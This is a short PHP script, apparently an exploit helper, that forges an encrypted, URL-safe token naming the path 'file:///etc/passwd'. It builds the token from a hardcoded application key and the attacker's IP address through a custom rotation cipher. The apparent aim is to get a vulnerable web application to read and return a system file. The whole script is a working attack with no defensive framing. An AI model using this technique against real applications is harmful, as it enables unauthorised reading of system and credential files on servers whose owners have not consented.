<?php
$file = "file:///etc/passwd"; //example target file to read
$ip = "172.17.0.1"; //change depending on your IP address that access the app
$app_key = "aeb067ca0aa9a3193dce3a7264c90187";
$key = md5($app_key . $ip);
function str_rot_pass($str, $key, $decrypt = false)
{
  $key_len = strlen($key);
  $result = str_repeat(' ', strlen($str));
  for ($i = 0; $i < strlen($str); ++$i) {
    if ($decrypt) {
      $ascii = ord($str[$i]) - ord($key[$i % $key_len]);
    }
    else {
      $ascii = ord($str[$i]) + ord($key[$i % $key_len]);
    }
    $result[$i] = chr($ascii);
  }
  return $result;
}
function base64_url_encode($input)
{
  return rtrim(strtr(base64_encode($input), '+/', '-_'), '=');
}
echo base64_url_encode(str_rot_pass($file, $key));
?>